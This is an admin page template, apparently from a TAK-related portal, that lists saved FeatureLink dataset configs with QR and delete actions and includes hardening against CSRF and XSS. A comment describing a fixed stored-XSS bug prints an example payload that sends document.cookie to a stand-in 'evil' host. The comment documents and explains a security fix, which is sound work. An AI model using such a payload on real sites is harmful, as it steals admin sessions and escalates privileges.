<%- include("partials/header") %>
<%- include("partials/sidebar") %>

<main class="main">
  <div class="row" style="justify-content: space-between; align-items: center;">
    <div>
      <h1 style="margin-bottom: 4px;">FeatureLink Configs</h1>
      <p class="muted" style="margin: 0;">
        Saved display configs for FeatureLayer exports — symbology, labels, popups, and QR
        sharing for the FeatureLink ATAK plugin. Field users browse the finished configs at
        <a href="/featurelink">FeatureLink</a> under Onboarding.
      </p>
    </div>
    <a class="btn" href="/featurelink-configs/configurator" style="font-size: 20px; font-weight: 700; padding: 18px 32px; line-height: 1;">+ Add Data Layer(s)</a>
  </div>

  <div class="card" style="margin-top: 16px;">
    <div id="configsMsg" class="msg"></div>
    <div id="configsLoading" class="muted">Loading...</div>
    <table id="configsTable" class="table" style="display: none;">
      <thead>
        <tr>
          <th>Name</th>
          <th>Group</th>
          <th>Source</th>
          <th>Fields</th>
          <th>Features</th>
          <th>Updated</th>
          <th></th>
        </tr>
      </thead>
      <tbody id="configsBody"></tbody>
    </table>
    <div id="configsEmpty" class="muted" style="display: none; margin-top: 16px;">
      No saved dataset configs yet. <a href="/featurelink-configs/configurator">Open the Display Configurator</a>
      to upload a dataset, set up its display config, and click Save — it'll show up here.
    </div>
  </div>
</main>

<div class="modalOverlay" id="qrModalOverlay" style="display: none;" onclick="if(event.target===this) closeQrModal()">
  <div class="modal" style="width: 320px; max-width: 90vw; text-align: center;">
    <div class="modalHeader">
      <h2 id="qrModalName" style="margin: 0; font-size: 14px; word-break: break-word;"></h2>
      <button class="btn" type="button" onclick="closeQrModal()">Close</button>
    </div>
    <div class="modalBody">
      <div id="qrCanvasWrap" style="display: flex; justify-content: center; margin-bottom: 16px; min-height: 220px; align-items: center;"></div>
      <div id="qrLinkText" class="muted" style="font-size: 11px; word-break: break-all; margin-bottom: 12px;"></div>
      <button class="btn" type="button" onclick="copyQrLink()">Copy link</button>
    </div>
  </div>
</div>

<!-- QR code generation. Vendored locally (C-38): this used to load from cdn.jsdelivr.net with no
     Subresource Integrity inside an authenticated admin page, which is both a supply-chain hole
     and — for a DDIL/air-gapped TAK deployment — a functional break, since every QR code on this
     page threw "QRCode is not defined" the moment the CDN was unreachable. Pinned to 1.4.4; see
     assets/featurelink-configurator/vendor/VENDOR.md for provenance and hashes. -->
<script src="/featurelink-configs/configurator/vendor/qrcode-1.4.4.min.js"></script>
<script>
(function () {
  // C-10: the double-submit CSRF token this page's mutating fetch() calls must echo back. Set as
  // a SameSite=Lax cookie by featurelinkCsrf.service.js when the page was served.
  function csrfToken() {
    const m = document.cookie.match(/(?:^|;\s*)fl_csrf=([^;]*)/);
    return m ? decodeURIComponent(m[1]) : '';
  }
  const msgEl = document.getElementById('configsMsg');
  const loadingEl = document.getElementById('configsLoading');
  const tableEl = document.getElementById('configsTable');
  const bodyEl = document.getElementById('configsBody');
  const emptyEl = document.getElementById('configsEmpty');

  function escapeHtml(s) {
    return String(s == null ? '' : s).replace(/[&<>"']/g, function (c) {
      return { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c];
    });
  }

  function datasetLink(id) {
    return window.location.origin + '/featurelink-configs/configurator?load=' + encodeURIComponent(id);
  }

  let qrLinkId = null;
  window.showQr = function (id, name) {
    qrLinkId = id;
    document.getElementById('qrModalName').textContent = name || 'Saved Dataset Config';
    document.getElementById('qrLinkText').textContent = datasetLink(id);
    const wrap = document.getElementById('qrCanvasWrap');
    wrap.innerHTML = '';
    const canvas = document.createElement('canvas');
    wrap.appendChild(canvas);
    QRCode.toCanvas(canvas, datasetLink(id), { width: 220, margin: 1, errorCorrectionLevel: 'M' }, function (err) {
      if (err) wrap.innerHTML = '<span class="muted">QR generation failed</span>';
    });
    document.getElementById('qrModalOverlay').style.display = 'flex';
  };
  window.closeQrModal = function () {
    document.getElementById('qrModalOverlay').style.display = 'none';
    qrLinkId = null;
  };
  window.copyQrLink = function () {
    if (!qrLinkId) return;
    navigator.clipboard.writeText(datasetLink(qrLinkId)).then(
      () => { msgEl.textContent = 'Link copied.'; },
      () => { msgEl.textContent = datasetLink(qrLinkId); }
    );
  };
  window.copyLink = function (id) {
    navigator.clipboard.writeText(datasetLink(id)).then(
      () => { msgEl.textContent = 'Link copied.'; },
      () => { msgEl.textContent = datasetLink(id); }
    );
  };

  /**
   * C-05 — stored XSS, fixed.
   *
   * The QR button used to be built by concatenating an inline onclick handler containing the
   * dataset id and the JSON-stringified dataset name, then assigning the whole row through
   * `tr.innerHTML`. JSON stringification escapes for *JavaScript*, not for HTML,
   * so the quote characters it emits terminated the `onclick="` attribute. A dataset named
   *     x" onmouseover="fetch('//evil/'+document.cookie)
   * — saveable by any logged-in non-admin, since `name` is only trimmed and truncated server-side
   * — executed in the ADMIN's browser on this page. That is privilege escalation from any user to
   * portal admin.
   *
   * Every cell is now built with createElement/textContent, and every action button carries its
   * data in `data-*` attributes read by the delegated listener below. No string of user data ever
   * reaches innerHTML, and there is not one inline handler left in this table.
   */
  function cell(tr, text) {
    const td = document.createElement('td');
    if (text !== undefined) td.textContent = text;
    tr.appendChild(td);
    return td;
  }

  function renderRow(d) {
    const tr = document.createElement('tr');

    cell(tr, d.name == null ? '' : String(d.name));

    const groupTd = cell(tr);
    if (d.group) {
      const badge = document.createElement('span');
      badge.style.cssText = 'white-space: nowrap; font-size: 11px; font-weight: 600; padding: 2px 8px; border-radius: 20px; background: var(--accent, #0078d4); color: #fff;';
      badge.textContent = d.group;
      groupTd.appendChild(badge);
    } else {
      const dash = document.createElement('span');
      dash.className = 'muted';
      dash.textContent = '—';
      groupTd.appendChild(dash);
    }

    const srcTd = cell(tr);
    const kind = document.createElement('span');
    kind.className = 'muted';
    kind.textContent = d.source_type === 'url' ? 'URL' : 'File';
    srcTd.appendChild(kind);
    srcTd.appendChild(document.createTextNode(' '));
    const srcVal = document.createElement('span');
    if (d.source_type === 'url') srcVal.style.wordBreak = 'break-all';
    srcVal.textContent = (d.source_type === 'url' ? d.source_url : d.file_name) || '';
    srcTd.appendChild(srcVal);

    // Guarded: the API can legitimately return null/undefined here for a config saved before the
    // field existed, and `.toLocaleString()` on that threw and blanked the whole page.
    cell(tr, Number.isFinite(Number(d.field_count)) ? String(Number(d.field_count)) : '0');
    cell(tr, Number.isFinite(Number(d.feature_count)) ? Number(d.feature_count).toLocaleString() : '0');
    cell(tr, d.updated_at ? new Date(d.updated_at).toLocaleString() : '');

    const actions = document.createElement('div');
    actions.className = 'row';
    actions.style.cssText = 'gap: 6px; justify-content: flex-end;';

    const open = document.createElement('a');
    open.className = 'btn';
    open.href = '/featurelink-configs/configurator?load=' + encodeURIComponent(d.id);
    open.textContent = 'Open';
    actions.appendChild(open);

    [
      { action: 'qr', label: 'QR', cls: 'btn' },
      { action: 'copy', label: 'Copy link', cls: 'btn' },
      { action: 'delete', label: 'Delete', cls: 'btn danger' },
    ].forEach((spec) => {
      const b = document.createElement('button');
      b.className = spec.cls;
      b.type = 'button';
      b.dataset.action = spec.action;
      b.dataset.id = d.id;
      b.dataset.name = d.name == null ? '' : String(d.name);
      b.textContent = spec.label;
      actions.appendChild(b);
    });

    cell(tr).appendChild(actions);
    return tr;
  }

  function loadConfigs() {
    loadingEl.style.display = '';
    tableEl.style.display = 'none';
    emptyEl.style.display = 'none';
    fetch('/api/featurelink/admin/datasets', { credentials: 'same-origin' })
      .then((r) => r.json())
      .then((d) => {
        loadingEl.style.display = 'none';
        const datasets = (d && d.datasets) || [];
        if (!datasets.length) {
          emptyEl.style.display = '';
          return;
        }
        // Datasets already arrive newest-first; re-sort so grouped ones (from a "keep
        // together" Web Map import) sit adjacent instead of interleaved by update time,
        // while everything ungrouped keeps its newest-first order.
        const sorted = datasets.slice().sort((a, b) => {
          if (a.group && b.group) return a.group === b.group ? 0 : a.group.localeCompare(b.group);
          if (a.group !== b.group) return a.group ? -1 : 1;
          return 0;
        });
        bodyEl.textContent = '';
        sorted.forEach((ds) => bodyEl.appendChild(renderRow(ds)));
        tableEl.style.display = '';
      })
      .catch(() => { loadingEl.style.display = 'none'; msgEl.textContent = 'Failed to load configs.'; });
  }

  // One delegated listener for the whole table — replaces the inline onclick handlers that were
  // the C-05 XSS sink, and survives re-renders without rebinding.
  bodyEl.addEventListener('click', function (ev) {
    const btn = ev.target.closest('button[data-action]');
    if (!btn || !bodyEl.contains(btn)) return;
    const id = btn.dataset.id;
    if (btn.dataset.action === 'qr') return showQr(id, btn.dataset.name);
    if (btn.dataset.action === 'copy') return copyLink(id);
    if (btn.dataset.action === 'delete') {
      if (!confirm('Delete this saved dataset config? This cannot be undone.')) return;
      fetch('/api/featurelink/admin/datasets/' + encodeURIComponent(id), {
        method: 'DELETE',
        credentials: 'same-origin',
        headers: { 'X-FeatureLink-CSRF': csrfToken() },
      })
        .then((r) => r.json())
        .then((dd) => {
          if (dd && dd.ok) loadConfigs();
          else msgEl.textContent = (dd && dd.error) || 'Delete failed.';
        })
        .catch(() => { msgEl.textContent = 'Delete failed.'; });
    }
  });

  loadConfigs();
})();
</script>
